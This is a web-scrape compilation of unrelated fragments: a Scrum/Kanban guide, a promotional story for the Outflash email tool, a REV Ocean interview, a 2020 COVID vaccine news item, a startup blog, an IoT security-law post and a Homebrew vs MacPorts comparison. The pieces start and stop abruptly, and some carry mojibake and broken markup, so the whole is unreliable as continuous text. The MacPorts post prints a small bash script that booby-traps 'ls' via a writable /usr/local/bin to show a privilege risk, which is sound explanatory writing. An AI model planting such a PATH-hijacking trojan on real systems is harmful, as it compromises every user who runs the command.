href="#agile-scrum-implementation">allow me to walk you through to implement agile with scrum</a>.</p><h2 id="when-to-choose-kanban">When to choose Kanban?</h2><p>Kanban is another popular methodology in agile. It is a progressive process that assures continuous delivery. There are no sprints here. Instead, the tasks in the project are prioritized and then completed a few items together at once, followed by the next set of remaining items. </p><p>Kanban board is used by teams to view the progress of the project at a micro-level. </p><p>Kanban is <em>the one</em> for your project if:</p><ul><li>There are many unrelated user stories and tasks</li><li>Requirements and their priorities keep changing like the weather</li><li>You wish to deploy multiple releases in less than a week, especially unscheduled ones </li></ul><p>Kanban is extremely flexible and fairly simple in terms of implementing. If you think that seems to fit the bill for your project, <a href="#agile-kanban-implementation">here's how you can implement agile using kanban</a>. </p><p><em>If you’re still debating between scrum and kanban, understand the differences between the two with the help of this article: <a href="https://zepel.io/agile/scrum-vs-kanban/?utm_source=agilelibrary&amp;utm_medium=text&amp;utm_campaign=agile-methodology-implementation-steps-guide/">Differences between scrum and kanban</a>.</em></p><hr><!--kg-card-begin: html--><h2 id="agile-scrum-implementation">Implementing Agile the Scrum Way</h2><!--kg-card-end: html--><p>If you get Scrum right, your project is guaranteed to be on its trajectory to success. 🚀</p><p>Take a quick look at the steps that go into successfully adopting scrum for your project.</p><h3 id="step-1-gathering-requirements-for-product-backlog">Step 1: Gathering Requirements for Product Backlog</h3><p>Before commencing your scrum project, you need to set the stage for it. That is, you need to gather all the business requirements and create a backlog called the product backlog with all the task items. </p><p>So go ahead, schedule a discussion with your product owner to get the business needs. </p><p>Your next priority is to get the product backlog items prioritized. </p><p><strong>Example: </strong>From your meeting with the product owner regarding the taxi service app, you've gathered all the business requirements and stored them as user stories.</p><p>You now discuss with the product owner and assign priorities to each of the items in this backlog. You've laid the foundation. </p><p>Setting priorities to items, communicating them with your team, and keeping a track of them can be a bit exhausting, to be honest.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>I was a frustrated, overworked, underpaid software developer.</p>



<p>I had worked for a company since graduating from University. Must have been for 4–5 years.</p>



<p>The company wanted a new cloud based product range creating and I was the only developer working on this product.</p>



<p>Myself, a few of the marketing and communications team, as well as a few of the sales guys, worked together to launch the product. We managed to sign up loads of new customers and transition a lot of existing enterprise customers onto the new product line.</p>



<p>The launch was a success.</p>



<p>Anyway. At the time I had recently bought my first house on my own. I was extremely lucky to be able to do this. However, money was really tight.</p>



<p>I was dating at the time too (happy to say that the girl is now my wife). We were always off out, going on dates. This was stretching my budget to the limit.</p>



<p>It had gotten to the point where I was fed up of not being paid enough for the value I was bringing to the company. I went to my boss with an amazing proposal and asked for a pay rise. Nothing major, but a decent amount that would make my life a bit more comfortable.</p>



<p>“I will see what I can do, I will ask the owner and MD, see what they say”. I was hoping for good things.</p>



<p>Two days later my boss came back. “Sorry, there isn’t enough cash flow at the minute, maybe we can give you a little pay rise in 6 months!”.</p>



<p>Looking back, I took it well. However, a few days later I nearly “blew my lid”.</p>



<p>Every Monday morning the owner of the company gave a business update to the entire company. He was happy to announce that the cloud product range I had been a key part of was a huge success for the business. And that it had added over £6 million to the overall value of the business.</p>



<p>“Surely the £6 million can cover my modest pay rise?” I shrugged it off and moved on.</p>



<p>Over the course of the next few days. The owner of the business turned up one day, driving a new Ferrari. A day later, driving a new McLaren. He had also bought his wife a new Range Rover. I was fuming. So much for having no cash flow in the business. I could see why.</p>



<p>It wasn’t just me that felt that way. One of the girls I had worked with on the product launch told me she had also asked for a pay rise. She was in the process of buying her first house with her boyfriend. The poor girl was nearly in tears as we were chatting, looking out the window at the owners new McLaren sports car.</p>



<p>That was it. That was my breaking point. I didn’t want to move jobs as the same situation would more than likely happen again.</p>



<p>I had to become the master of my own destiny.</p>



<p>So I started trying to find freelance customers and start my own software business. I really wanted to make my own money and not rely on an employer so I wouldn’t have to keep working in a 9–6 job that I hated.</p>



<p>I wanted to be able to support myself and my future wife so she wouldn’t have to work and I could start a family.</p>



<p>The thing is, I was living pay cheque to pay cheque, struggling to make the move to freelancing. That meant I wasn’t able to support my girlfriend so she wouldn’t have to work, let alone start a family.</p>



<p>To make things worse, I felt terrible because everything I tried, failed and I couldn’t seem to land that first well paying customer. I felt even worse about the situation because I had no clue if all these emails and proposals I was sending out was going to be in vain and that I’d look stupid in the end. I felt like a failure as a boyfriend and a professional.</p>



<p>The problem was that I had ZERO experience in communicating with potential clients and showing how valuable my software skills could be to their business. Which meant working to the early hours each evening, putting proposals together, trying to write professional emails. I wasn’t getting any response from the businesses I was reaching out to, which meant my dreams of being my own boss and supporting my family was squashed on a daily basis.</p>



<p>Then, as if by chance, something amazing happened…</p>



<p>That’s when I met up with an old University friend of mine, who had been freelancing for years and he showed me his simple framework all about how to build up a pipeline of potential customers!</p>



<p>It was now crystal clear to me how to structure subject lines, emails and proposals in a certain way that made potential clients sit up and take note, because I saw that I could use a repeatable framework that worked and spend less time on prospecting.</p>



<p>I also learned that you DON’T need to show them your portfolio or body of work, you need to focus on how you can solve their problems and meet their needs instead.</p>



<p>As a result I started testing what worked and came up with my own templates and framework.</p>



<p>After I did that, I started getting responses to the emails I was sending out, even started getting referrals. If someone didn’t need my services but knew of someone who did they passed on my details.</p>



<p>Suddenly, I was making enough money to cover my house payment and my direct debits every month, working part time freelancing.</p>



<p>That’s when I realized that the secret to finding freelance customers and start my own business was create a system and automation to send even more emails out to old customers and new leads.</p>



<p>My plan was to start an email list and use the framework to contact old customers as well as new prospects.</p>



<p>So I started documenting the framework, templates and cheat sheets. But I didn’t stop there.</p>



<p>I then sat down and used my framework to send out more emails than ever before.</p>



<p>Starting by contacting more and more of my existing customers and then tried to find new customers.</p>



<p>But there was still a problem…</p>



<p>It still took a LONG time to sit down at the keyboard and type out each email to a prospect.</p>



<p>It took hours and hours each evening. After working all day, getting the emails sent was NO fun.</p>



<p>Some emails would work and you would a get response. Others you would hear crickets. It was an even harder task of sending follow-up emails to people who hadn’t responded. But you still had to bust a gut to write each one.</p>



<p>THEN you had to start working on the freelance gigs that you had managed to land and all the other stuff you need to do as a freelancer.</p>



<p>So it was still a LOT of work, a LOT of time and a LOT of risk to send that many emails this way.</p>



<p>Also, I wasn’t going to paying for an expensive third party email services, I wasn’t covering my monthly salary yet, so I wasn’t going to start paying for tools that I didn’t really need.</p>



<p>I ended up getting so frustrated that I decided to create a better process, using technology, strategy, and software, to send all the emails I needed not in hours… but in just a few minutes!.</p>



<p>I chose to call it “Outflash — The Get More Clients Now System”.</p>



<p>I thought if I could create something that would make it possible to help freelancers reach more customers and leads in less time, I’d be really happy.</p>



<p>After 6 months of programming and spending my weekends putting together all the information I had gathered into a reusable framework, we created <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> for Outlook.</p>



<p>I can now use Outlook and <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> to send more emails than ever before in a fraction of the time.</p>



<p>I then started to let other struggling freelancers use <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a>.</p>



<p>As a result of all this we were able to achieve the following:</p>



<p>Help freelancers and small businesses to use the exact process and software we use to send emails using an existing application you already, know, love and pay for. So you no longer need to rely and pay for expensive, complicated email marketing platforms. Allowing you to create a endless list of clients to grow your business.</p>



<p>After creating <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a>, I was not only able to create a single email that can be sent to multiple people all from inside Outlook, I’ve also been able to stop spending hours and hours contacting new leads. Or touching base with old customers, because I can now contact as many customers as I would like in minutes.</p>



<p>And in the end, all of this means I’m now able to help a lot more people run their small business and achieve their dream of having a huge list of customers, willing to pay for their services.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>I</span>n May of 2017, Norwegian industrialist Kjell Inge RÃ¸kke promised to give away nearly all of his $2.4 billion fortune. He started by founding REV Ocean—the name of both a conservation initiative and the custom-built ship that would carry it forward.<br></p>

<p>The 600-foot-long REV Ocean yacht, the worldâ€™s largest Research and Expedition Vessel, should be ready for operation in 2022. It sports cutting-edge scientific instrumentation, laboratories, and its own remote-operated and autonomous underwater vehicles. RÃ¸kke calls it â€œa platform for gathering knowledge,â€� and at the shipâ€™s figurative helm will be Nina Jensen.</p>
<p>Originally trained as a marine biologist, Jensen previously served as secretary general of World Wildlife Fund Norway. There she fought for fisheries reform and pushed for the nationâ€™s $1 trillion USD pension fund to divest from fossil fuels. â€œThis had global ramifications,â€� says Jensen. â€œA lot of investors worldwide look to the Fund in terms of the investment decisions that they make.â€�</p>
<p>As REV Oceanâ€™s CEO, Jensen oversees their search for solutions to climate change, overfishing, and plastic pollution. Rather than sponsoring their own in-house researchers, REV Ocean will make their resources available to scientists, innovators, and conservationists from all over the world. â€œWe need to imagine the unthinkable,â€� she says, â€œand come up with solutions that are probably much more creative than those that we're working on today.â€�</p>
<p><em>Nautilus</em> talked to Jensen about REV Oceanâ€™s work and the future of Earthâ€™s imperiled ocean.</p>
<p><strong>It seems there is a lesson to be learned from what's happened with the pandemic in respect to the environmental crisis. What do you think of that?&nbsp;</strong></p>
<p>There seems to be this tendency of wanting to undermine scientists and leading experts who are sounding the alarm on critical issues, probably because the dimensions of the potential crisis are sometimes difficult to accept. So that's sort of the first line of response—and that's the same for a virus outbreak like this, the dramatic loss of nature, and climate change.</p>
<p><strong>What is it going to take to actually get some kind of global action on climate change? Or is it a dream?</strong></p>
<p>I think most people now finally realize there is a problem. I think people just feel like the scale of the problem is so massive that how can <em>they</em> impact it? They're just expecting somebody else to fix it—but nobody else will. It's you and me, us, we have to fix this. That's the thing. And I think there has to be much stronger global transparency and accountability and accountability in terms of emissions, and an increasing use of the taxation system in terms of dealing with it.</p>
<p>As an example, I think we need to start holding investors personally accountable for the investments they're making when it comes to climate and environmental destruction. There should be a much higher degree of accountability and transparency in terms of what we are investing in and the associated impacts of those investments. Exactly how to do that, I must admit I haven't really sorted out yet—but I think that could be a critical part of the solution. And making sure that climate change and environmental destruction to a degree is recognized as a crime, like genocide or war crimes.</p>
<p><strong>A lot of institutions are taking their investments more seriously regarding the environment, and they're divesting from fossil fuels, but how would you hold investors responsible for their investments? That seems like quite a leap. Is it possible?</strong></p>
<p>I think anything is possible. And to really solve the climate change problem we need to imagine the unthinkable and come up with solutions that are probably much more creative than those we're working on today. But given that we're also moving so rapidly forward with emissions still rising, and we're nowhere near reaching the two degrees Celsius target, probably we are way beyond that already. Meaning that weâ€™ll also need to develop carbon-negative solutions to really make sure that we are taking out what we've already emitted. But yeah, I would say anything is possible, and it has to be possible, because we're way beyond traditional measures to solve this.</p>
<blockquote>Anything is possible, and it has to be possible.</blockquote>
<p><strong>There are so many different climate models out there, some more serious than others, some relegating the cause to natural cycles rather than human action. Why all the discrepancies, do you think?</strong></p>
<p>Our entire society is built around a system that is basically flawed. We're thinking that we can continue with economic growth into eternity, and that that's what will also make us happy and healthy and thrive—which is obviously not right. And it's basically a system that is catering to, in many ways, a select few who are becoming increasingly wealthy at the expense of the rest of the population and the long-term survival of humanity.</p>
<p>Completely changing the societal system that we've built our modern ways of living and doing business around is obviously really, really complex and difficult. We would need to change the way that we run and do future businesses, and a lot of people, particularly those who are the biggest climate deniers and skeptics towards this, are the ones that are facing the biggest economic consequences of those changes.&nbsp;</p>
<p>Which is why you're usually seeing the biggest amount of climate skeptics and deniers in oil-producing countries, for example, and why you're seeing that those who have spent a lot of money and resources on trying to undermine climate science are coming from the fossil fuel industries.</p>
<p><strong>What do you think the state of the ocean will be in 20 years?</strong></p>
<p>I'm an eternal optimist. We've lost more than 40 percent of life in the ocean in just the last 40 years—but if you look 20 years forward, I would hope that we've been able to reverse that situation, that we've rebuilt at least a big part of what we've destroyed, that we're seeing flourishing ecosystems all over the world, particularly linked to kelp forests, mangroves, and sea grasses that are also essential nature-based climate solutions and soaking up probably 40 to 50 times more CO2 than land-based forests while replenishing depleted fish stocks. We would also keep plastics out of the ocean and not use the ocean as a massive waste dump.</p>
<p><strong>What do you think is the worst-case scenario if governments and people don't do something?</strong></p>
<p>That the ocean continues to become more acidic, warmer, and less productive. That additional fish stocks will be on the verge of total collapse, meaning that we will be able to harvest even less food from the ocean—which will also be a massive problem in a future where climate change will have a dramatic impact on land-based food production. And that we'll see complete shifts in ecosystem functioning around the world, with new species taking over. Just a completely different ocean from what we know today, basically.</p>
<p>Based on what the science is telling us, we will also have a dramatic increase in oxygen-depleted areas, which will mean less-productive seas and also an additional decline in key species. And, of course, the loss of entire coral reef systems that have been around for thousands of years and that are some of the most magnificent things on this planet that we've managed to destroy in pretty much one generation.</p>

</span><br><span>Espen Gjelsten / Fuglefjellet</span></figcaption></figure>
<p><strong>What do you think will be the most important contribution that the REV Ocean ship and all of your efforts can make?</strong><br></p>
<p>I hope and think that it will be to take us into concrete action. I mean, there's so much talk about environment, about climate change, but not enough practical action. We know already enough to get moving—but what we're not doing well enough is to collaborate, share data, experiences, solutions, and work together to improve the situation. So I really hope that the REV Ocean vessel can be a convening platform that brings together a wide variety of stakeholders, backgrounds, geographies and people to really get moving and fast track the solutions. And that we're also able to pair the solutions with funding and investors, so that it can be replicated and scaled worldwide.</p>
<p><strong>You come from a family of very strong women. Can you tell me a little about your great-grandmother?</strong></p>
<p>You've done your research so well. She was the first female factory inspector in Norway. And she was definitely a person who would challenge the status quo and the society's norms when it came to women. She was also fighting for women's rights all along. She challenged the concept that women had to wear skirts, that they couldn't sit with their feet across on a bicycle—things that seem absolutely ridiculous to us in this day and age. And of course she also promoted education and for women to actually take a degree and have voting rights.</p>
<p>She was an inspiration for all of us coming after her. She also left a legacy of commitment and a bit of pressure in terms of really making a difference in the world, because she certainly did in her time. And to be honest, I think if she was alive today, her mission would be the environment because there is no bigger issue that society is facing today than the environmental destruction that we're seeing all over the world.</p>
<p><strong>Do you think women have a different perspective on science?</strong></p>
<p>Not that I've picked up on. I think the biggest problem is that we haven't been able to recruit enough women into the science fields. And certainly had a society that has been shaped in a way that has made it more difficult for women to engage in various scientific fields. Thankfully that has largely changed and will continue to change. And I'm a firm believer of diversity in its full capacity, whether it's gender, age, geography, or background, if we are to solve the big scientific mysteries and societal challenges.</p>
<p><strong>One last question: What was your most inspiring ocean experience?</strong></p>

                <p><strong>LONDON –</strong> Britain today became the first Western country to approve a Covid-19 vaccine for general use as it announced a rollout of Pfizer-BioNTech's drug from next week.&nbsp;</p>

<p>"The government has today accepted the recommendation from the independent Medicines and Healthcare products Regulatory Agency (MHRA) to approve Pfizer-BioNTech's Covid-19 vaccine for use," the Health Department said in a statement.</p>

<p>"The vaccine will be made available across the UK from next week," the statement said. Priority groups will include care home residents, health and care staff, the elderly and the clinically extremely vulnerable.</p>

<p>After months of "rigorous" clinical trials and thorough analysis of the data, the MHRA "concluded that the vaccine has met its strict standards of safety, quality and effectiveness", the statement added.</p>

<p>"To aid the success of the vaccination programme, it is vital everyone continues to play their part and abide by the necessary restrictions in their area so we can further suppress the virus and allow the NHS (National Health Service) to do its work without being overwhelmed."</p>

<p>Pfizer chairman Albert Bourla said it was a "historic moment in the fight against Covid-19".&nbsp;</p>

<p>"This authorisation is a goal we have been working toward since we first declared that science will win, and we applaud the MHRA for their ability to conduct a careful assessment and take timely action to help protect the people of the UK," he said.</p>

<p>Pfizer and BioNTech added that they expected further regulatory decisions from other countries "in the coming days and weeks".</p>

<p>The announcement came as England exited a month-long coronavirus lockdown, but most of the country remained under restrictions as a new regional system for cutting infection rates kicked in.</p>

<p>The four-week lockdown, which began last month, was imposed to stop surging rates of infection, ease pressure on health services, and to allow families to gather for Christmas.</p>

<p>Prime Minister Boris Johnson, a Covid survivor, succeeded in winning a vote on the measures in parliament late yesterday, despite significant opposition within his own Conservative ranks.</p>

<p>"All we need to do now is to hold our nerve until these vaccines are indeed in our grasp and indeed being injected into our arms," he told lawmakers before the vote.</p>

<p>Until then "we cannot afford to relax, especially during the cold months of winter", he warned. – AFP, December 2, 2020</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>30 Nov 2020</span></p><p>Venture capital backed startups are all about creating hyper-growth businesses. There is nearly no valuation upper bound for what we define as a startup as long as the company is sustaining its <a href="https://www.investopedia.com/terms/h/hockey-stick-chart.asp">hockey stick growth trajectory</a>. But what happens after a startup’s existing market is slowly saturated? Startups oftentimes rely on launching new business lines as a way to tap into new markets. This is different from rolling out a new product or feature since the new initiative is often operating as a separate legal entity with different business models. Think of <a href="https://www.ubereats.com/gb">Uber Eats</a> at Uber or <a href="https://stripe.com/atlas">Stripe Atlas</a> at Stripe - startups are essentially incubating new startups within themselves. These new lines not only leverage the existing strengths of the parent company, but also actively strengthen the core product offering by developing new channels for customers to gain value from the original product.</p>

<p>I became fascinated by this topic while helping to launch new business lines at Blend. Creating a new business line gives a company the freedom to innovate rapidly in a new market while leveraging existing distribution network and technical infrastructure. With sufficient resources and deliberate execution, there really is no ceiling to what a company can achieve. But companies generally face the hard economic trade-offs on investing in new business lines due to finite resources.</p>

<p>The fundamental challenge for companies to understand is what their competitive advantage is in the new market. Then it branches out into related follow-ups: Could you leverage existing distribution channels efficiently in the new market? How to utilize the current infrastructure for running new experiments economically? What does it mean to build cohesive branding across multiple business lines with underlying connectivity? How do developers build scalable software that is compatible with the current system? By and large, companies may start off deliberating on the following themes when pursuing a new business line:</p>
<ol>
  <li><strong>Advantage</strong>: understand your unique competitive advantage in a new market</li>
  <li><strong>Cohesion</strong>: build a cohesive branding narrative across multiple business lines</li>
  <li><strong>Cross-sell</strong>: validate the opportunity to sell a new offering to your existing customer base</li>
  <li><strong>Experiment</strong>: prove the business hypothesis quickly and cheaply</li>
  <li><strong>Evolution</strong>: build your system as an evolving organism</li>
</ol>

<p>There really is no one-size-fits-all formula for how to launch a new business line successfully. Even at Blend when two separate business lines are sharing the same overarching objective of making the home-buying process simpler for consumers, we had to reconstruct a new empirical model for each new business. I have seen few cases where we can simply “copy-and-paste” what is working in business line A to business line B without contextual changes. While it is useful to follow a guiding framework for the approaches and strategies, it is unavoidable to keep the execution details loose when dealing with growing business complexity.</p>

<p>There are an abundance of frameworks to cherry pick from, most with detailed explanations available on the Internet: <a href="https://www.mindtools.com/pages/article/build-measure-learn.htm">establish a closed feedback loop</a>, <a href="https://dashhudson.medium.com/pinterest-metrics-how-to-measure-and-what-to-do-with-them-274b7c4d3f4e">measure meaningful key metrics</a>, <a href="https://www.forbes.com/sites/sunniegiles/2018/04/30/how-to-fail-faster-and-why-you-should/?sh=1e73d18ac177">move quickly and fail fast</a>, <a href="https://www.ycombinator.com/library/6g-how-to-talk-to-users">talk to customers</a>, <a href="https://www.ycombinator.com/library/6f-how-to-plan-an-mvp">build an MVP</a>, and so on. If the new business hypothesis were proven by actual demand, the startup would then focus on scaling the new business mostly as an independent entity, transitioning into a multi-business line company. For internet businesses, it’s worth highlighting the importance of recognizing software systems as an evolving organism. An unusable piece of software is literally useless, regardless how great it is in design. Companies should always evolve their software systems to fit the business needs. It is nearly impossible to design a perfect system architecture at the outset mostly due to the fast changing nature of the business - always build incrementally. The business experiment might begin as a module in the monolith, then migrate out as a single service, and eventually extend and scale up as business-specific multi-services.</p>

<p>Launching a new business line generally has a higher chance of success, compared to launching a startup, because new startups have small runways and usually fewer competitive advantages. Those new lines of businesses are accelerating off the premade rails from the existing business and can spur new directions of growth for the parent company. If a company is capable of sustaining hyper-growth with emerging business lines, I don’t see why innovation would stop even as a company turns “corporate”, as innovation should always be the key driver for startups to create a better society.</p>

    <div>
      
            
      <p>Our mission to secure the world’s connected devices got a timely boost when the US Senate passed the <a href="https://www.congress.gov/116/bills/hr1668/BILLS-116hr1668eh.pdf" target="_blank">Internet of Things (“IoT”) Cybersecurity Improvement Act (H.R. 1668)</a> into law. This is the brainchild of Congresswoman Robin Kelly from Illinois.
The legislation provides for the establishment of a minimum set of cybersecurity standards for government purchased, internet connected devices.</p>
<p>The National Institute of Standards and Technology (NIST) has been directed through the legislation to provide standards and guidelines for the  federal government agencies to comply with in order to better  manage the security of their IOT devices. These standards and guidelines are designed to provide a high level of continuity and more progress on the work already done by these agencies to address considerations around vulnerability detection, identity management, patching and the configuration of their IOT devices. </p>
<p><em>Don’t comply, Fed won’t buy</em></p>
<p>There is also a procurement dimension to the legislation and the law will require federal purchasers to apply restrictions on the purchase of devices from vendors who do not meet the NIST standards and guidelines. There are waivers in certain instances such as national security or research purposes, but the general rule will apply greater discipline to the treatment of security in product design and sale. This is obviously going to have a very big impact on manufacturers in the private sector who will need to meet these requirements to sell into federal government departments. There is likely to be an overspill effect into broader industrial and consumer electronics markets as the government starts to stand up and take IoT device security at all levels very seriously.</p>
<p><em>Get out of the kitchen if you can’t take the heat</em></p>
<p>It’s timely that in a <a href="https://mender.io/blog/good-news-the-u-s-house-passes-the-iot-cybersecurity-bill" target="_blank">recent blog post</a> our CEO Thomas Ryd noted that with these new IOT cybersecurity regulations being introduced, vendors who have not placed security at the center of their product development strategies will have to take a serious look at what they are doing, if they want to stay relevant and competitive in the market. </p>
<p>The <strong>Triangle of Trust</strong> is the strategic framework that guides product strategy and development at Northern.tech and Mender. We educate our customers to put this principle at the centre of their connected device management strategy. </p>
<p>Only <strong> authorised people</strong> can deploy <strong>authorised software</strong> to <strong>authorised devices</strong>. </p>
<p>Which leads to</p>
<p>Only the <strong> right people</strong> deploying the <strong>right software</strong> to the <strong>right devices</strong>.</p>
<p><em>Security in action in our IOT</em></p>
<p>We have developed the security features and strategic partnerships to translate this principle into operational reality for our customers. This puts us at the forefront of the market. For example, we work with NXP to support hardware encryption on their iMx gateway processors. This means that a device is highly secure from tampering with and malicious take over attempts. We also support Mutual TLS handshakes and PKP certificates and align to enterprise security standards and policies. We also consider less complex gateway devices and support elliptic curve cryptography for resource-efficient security and protection. </p>
<p>We thank Congresswoman Kelly for progressing and enacting this important legislation with fellow legislators in the US Senate. We believe that we are a provider that has prepared for this day, and have anticipated the requirements knowing that it was in the best interests of the customers we serve to make sure their devices avoid malicious attacks. </p>
<p>You can read the full details on this landmark legislation from <a href="https://www.natlawreview.com/article/breaking-news-internet-things-cybersecurity-legislation-clears-congress-heads-to" target="_blank">here</a>.</p>

</header>
<section>
	<p>A couple of months ago, I uninstalled <a href="https://brew.sh/">Homebrew</a> and migrated my configuration to <a href="https://www.macports.org/">MacPorts</a>. I’ve been doing a lot of thinking about the state of package management on macOS, and here’s what I’ve come up with based on my experiences using both and interacting with their development communities.</p>

<h2 id="a-brief-history-of-package-managers-on-macos">A brief history of package managers on macOS</h2>

<p>Package management on macOS has a somewhat complex history, mostly owing to the fact that unlike most Linux distributions, macOS does not ship with a default package manager out of the box. It’s not surprising that one of the first projects to solve the problem of package management, <a href="http://www.finkproject.org/">Fink</a>, was created very early, with its initial releases predating that of Mac OS X 10.0 by several months. Using Debian’s dpkg and APT as its backend, Fink is still actively maintained, though I haven’t looked at it very closely.</p>

<p>MacPorts, on the other hand, was released in 2002 as part of <a href="https://en.wikipedia.org/wiki/Darwin_(operating_system)#OpenDarwin">OpenDarwin</a>, while Homebrew was released seven years later as a “solution” to many of the shortcomings that the author saw in MacPorts. In case it isn’t obvious from the introduction, it’s these two that we’ll be talking about. Sorry, Fink :(</p>

<h2 id="architecture">Architecture</h2>

<p>While both MacPorts and Homebrew try to solve the same problem, they really are designed quite differently from each other. These differences become immediately evident once you start using them: I personally feel that MacPorts is clearly the better architected, more mature package manager of the two.</p>

<h3 id="to-sudo-or-not-to-sudo">To <code>sudo</code> or not to <code>sudo</code></h3>

<p>Homebrew makes several questionable design decisions, but one of these deserves its own section: the choice to <a href="https://github.com/Homebrew/brew/blob/21bb9f6f5b535c35e1c3e5c1e2327c46d5756e80/docs/FAQ.md#why-does-homebrew-say-sudo-is-bad">explicitly eschew root</a> (in fact, it will refuse to work at all if run this way). This fundamentally is a <em>very bad idea</em>: package managers that install software for all users of your computer, as Homebrew does by default, should <em>always</em> require elevated privileges to function correctly. This decision has important consequences for both security and usability, especially with the advent of System Integrity Protection in OS X El Capitan.</p>

<p>For quite a while, Homebrew essentially considered itself the owner of <code>/usr/local</code> (both metaphorically and literally, as it would change the permissions of the directory), to the point where it would do things like plop its README down directly into this folder. After rootless was introduced, it moved most of its files to subdirectories; however, to maintain the charade of “sudo-less” installation, Homebrew will still trash the permissions of folders inside <code>/usr/local</code>. Homebrew’s <a href="https://github.com/Homebrew/brew/blob/2be7999878702554f1e1b5f4118978e670e6156c/docs/Troubleshooting.md#check-for-common-issues">troubleshooting guide</a> lists these out, because reinstalling macOS sets the permissions back to what they’re supposed to be and breaks Homebrew in the process:</p>

<blockquote>
  <p>If commands fail with permissions errors, check the permissions of <code>/usr/local</code>’s subdirectories. If you’re unsure what to do, you can run <code>cd /usr/local &amp;&amp; sudo chown -R $(whoami) bin etc include lib sbin share var opt Cellar Caskroom Frameworks</code>.</p>
</blockquote>

<p>Telling users to use <code>sudo</code> as a hammer to smash permissions “issues” that arise as a result of the system trying to fix damage caused by supposedly “sudo-less” software is quite ironic (and this is a bad practice in and of itself: it’s teaching users to fix problems by blindly running <code>sudo chown -R</code>). But really, this is <em>bad, bad</em> advice. Not only does this make Homebrew completely unusable for multi-user systems, it opens up a security hole (actually, <a href="https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43">multiple</a>): with <code>/usr/local/bin</code> being shared (and the first in <code>$PATH</code>!!), it’s not hard to see how changing the permissions on this directory leads to trouble. Consider a malicious shell script running with the privileges of the current user (perhaps something <a href="https://brew.sh/#install">you found on the internet</a>?) that makes a file at <code>/usr/local/bin/ls</code>:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>if</span> <span>[[</span> <span>$(</span><span>id</span> <span>-u</span><span>)</span> <span>-eq</span> 0 <span>]]</span><span>;</span> <span>then
	</span><span>echo </span>pwned <span># you didn't happen to run "sudo ls", did you?</span>
<span>else
	</span><span>ls</span> <span>"</span><span>$@</span><span>"</span> <span># move along, nothing to see here</span>
<span>fi</span>
</code></pre></div></div>

<p>Boom, now <code>ls</code> is booby-trapped for everyone on the system.</p>



<h3 id="the-macports-philosophy">The MacPorts philosophy</h3>

<p>MacPorts, on the other hand, swings so far in the other direction that it’s actually borderline inconvenient to use in some sense. Philosophically, MacPorts has a very different perspective of how it should work: it tries to prevent conflicts with the system as much as possible. To achieve this, it sets up a hierarchy under <code>/opt</code> (which is the annoying bit, because this directory is not on <code>$PATH</code> by default, nor is picked up by compilers without some prodding).</p>

<p>Of course, this design means that there is a single shared installation is among users, so running <code>port</code> requires elevated privileges whenever performing an operation that affects all users (which, admittedly, is most of the time). MacPorts is smart about this, though: it will shed permissions and run as the <code>macports</code> user whenever possible.</p>

<p>In line with their stated philosophy to prevent conflicts with macOS, MacPorts will set up its own tools in isolation from those provided by the system (in fact, builds run in “sandboxes” under the <code>macports</code> user, where attempts to access files outside of the build directory–which includes system tools–are intercepted and blocked). This means MacPorts needs to install some “duplicate” tools (whereas Homebrew will try to use the ones that come with your system where possible), the downside of which is that there is an one-time “up-front” cost as it installs base packages. The upside is that this approach is significantly more contained, which makes it easier to manage and more likely to continue working as macOS changes under it.</p>

<p>Finally, MacPorts just seems to have a lot of thought put into it with regards to certain aspects: for example, <a href="https://guide.macports.org/chunked/internals.registry.html">the MacPorts Registry database</a> is backed by SQLite by default, which makes easily introspectable in case something goes wrong. Another useful feature is built-in “livechecks” for most ports, which codify upstream version checks and make it easy to see when MacPorts’s package index need to be updated.</p>

<h2 id="day-to-day-usage">Day-to-day usage</h2>

<p>Architecture aside, a package manager is only useful if it’s possible to actually use it. There are a couple of subareas that I feel are important, and we’ll look at how each package manager does for each in turn.</p>

<h3 id="package-availability">Package availability</h3>

<p>Nominally, MacPorts has <a href="https://www.macports.org/ports.php?by=all">over 20,000 ports</a> ports available to install by default, while Homebrew has <a href="https://formulae.brew.sh/formula/">just shy of 5,000</a> formulae (plus a couple thousand more in homebrew/cask). Of course, the only thing this really tells us is that both of them have a <em>lot</em> of packages; both of these numbers are pretty meaningless as they contain things like versioned packages and other kinds of number-inflation. If you are looking for a popular, established package, neither will disappoint: packages like <code>gcc</code>, <code>vim</code>, and <code>wget</code> are available and up-to-date on both MacPorts and Homebrew.</p>

<p>Where availability starts to differ is with lesser-used packages: MacPorts seems to have quite a few older packages that Homebrew never picked up, while Homebrew is more likely to have newer packages. Homebrew’s are slightly more up-to-date, but I think this is likely a result of having fewer packages to manage and more support to do this job, as well as an increased proclivity to remove packages that are hard to get working on the latest version of macOS. Overall, I don’t think it’s fair to say that either package manager has an advantage here; ultimately this comes down to what you will end up needing. If you’re switching between the two, it’s almost guaranteed that there’s going to be something that’s conspicuously missing from the new package manager to annoy you ;)</p>

<h3 id="usability">Usability</h3>

<p>Homebrew aims to be simple and easy to use, and in general this is true. While I’m neutral on the use of beer-related terminology and emoji, the judicious use of color is quite helpful, as is the well-formatted output. Most common usecases are straightforward, though occasionally commands can end up doing surprising things if you use them in strange ways.</p>

<p>MacPorts, on the other hand, is by no means unusable, but it’s not as polished as Homebrew is. The lack of color, as well as somewhat more cluttered and less relevant output, makes it a bit less pleasant to work with (I have a couple of patches that I apply to get the behavior I want, but expecting most users to do this is unreasonable of course). However, overall, MacPorts handles being more complex quite well, and should be pretty serviceable for most users–especially those who have used another package manager.</p>

<p>The two package mangers differ in how they distribute packages: MacPorts almost always builds packages from source, while Homebrew has continuously gotten less and less permissive of letting you do this (opting instead for downloading pre-built binaries). From a usability perspective, binaries are a clear winner: packages install much quicker and are usable nearly immediately, and you don’t leave your computer barely usable because it’s been compiling the newest version of LLVM for the last four hours. Overall, however, this is less of a problem than it may seem at first, since most package are small and build relatively quickly, making long <code>port upgrade outdated</code> invocations quite rare.</p>

<h3 id="features">Features</h3>

